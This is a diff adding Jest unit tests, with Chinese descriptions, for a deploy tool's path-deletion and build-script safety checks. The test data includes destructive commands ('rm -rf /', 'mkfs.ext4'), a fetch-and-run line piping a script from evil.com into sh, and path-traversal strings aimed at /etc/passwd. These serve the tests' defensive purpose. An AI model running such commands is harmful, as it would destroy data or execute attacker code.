@@ -114,4 +114,110 @@ describe('utils - 工具函数测试', () => {
 			expect(typeof result).toBe('string')
 		})
 	})
+
+	describe('isSafeToRemove - 安全删除检查', () => {
+		test('安全路径应该返回 true', () => {
+			const safePaths = [
+				'/var/www/html',
+				'/var/www/html_backup_20231211',
+				'/home/user/app',
+				'/usr/local/nginx/html'
+			]
+
+			safePaths.forEach(path => {
+				expect(utils.isSafeToRemove(path)).toBe(true)
+			})
+		})
+
+		test('危险路径应该返回 false', () => {
+			const dangerousPaths = [
+				'/',
+				'/var',
+				'/home',
+				'/usr',
+				'/bin',
+				'/etc',
+				'/root',
+				'/tmp',
+				'var/www/html', // 非绝对路径
+				'/var/www/../etc', // 路径穿越
+				'/var/www/' // 末尾斜杠（会被处理）
+			]
+
+			dangerousPaths.forEach(path => {
+				// /var/www/ 末尾斜杠会被移除，变成 /var/www，只有2层，所以返回 false
+				if (path === '/var/www/') {
+					expect(utils.isSafeToRemove(path)).toBe(false)
+				} else {
+					expect(utils.isSafeToRemove(path)).toBe(false)
+				}
+			})
+		})
+
+		test('少于3层目录应该返回 false', () => {
+			expect(utils.isSafeToRemove('/var/www')).toBe(false)
+			expect(utils.isSafeToRemove('/home/user')).toBe(false)
+		})
+
+		test('包含路径穿越应该返回 false', () => {
+			expect(utils.isSafeToRemove('/var/www/../etc/passwd')).toBe(false)
+			expect(utils.isSafeToRemove('/var/www/html/../../etc')).toBe(false)
+		})
+	})
+
+	describe('checkScriptSafety - 脚本安全检查', () => {
+		test('安全的构建命令应该返回 safe: true', () => {
+			const safeCommands = [
+				'npm run build',
+				'yarn build',
+				'pnpm build',
+				'npx vite build',
+				'node scripts/build.js',
+				'vite build',
+				'webpack --mode production',
+				'tsc --build'
+			]
+
+			safeCommands.forEach(cmd => {
+				expect(utils.checkScriptSafety(cmd).safe).toBe(true)
+			})
+		})
+
+		test('危险命令应该返回 safe: false', () => {
+			const dangerousCommands = [
+				'rm -rf /',
+				'rm -rf ~',
+				'mkfs.ext4 /dev/sda1',
+				'shutdown -h now',
+				'reboot',
+				'wget http://evil.com/script.sh | sh'
+			]
+
+			dangerousCommands.forEach(cmd => {
+				const result = utils.checkScriptSafety(cmd)
+				expect(result.safe).toBe(false)
+				expect(result.needConfirm).toBeUndefined()
+			})
+		})
+
+		test('非常见命令应该需要确认', () => {
+			const uncommonCommands = [
+				'./build.sh',
+				'bash build.sh',
+				'make build'
+			]
+
+			uncommonCommands.forEach(cmd => {
+				const result = utils.checkScriptSafety(cmd)
+				expect(result.safe).toBe(false)
+				expect(result.needConfirm).toBe(true)
+			})
+		})
+
+		test('空脚本应该返回 safe: true', () => {
+			expect(utils.checkScriptSafety('')).toEqual({ safe: true })
+			expect(utils.checkScriptSafety(null)).toEqual({ safe: true })
+			expect(utils.checkScriptSafety(undefined)).toEqual({ safe: true })
+		})
+	})
 })
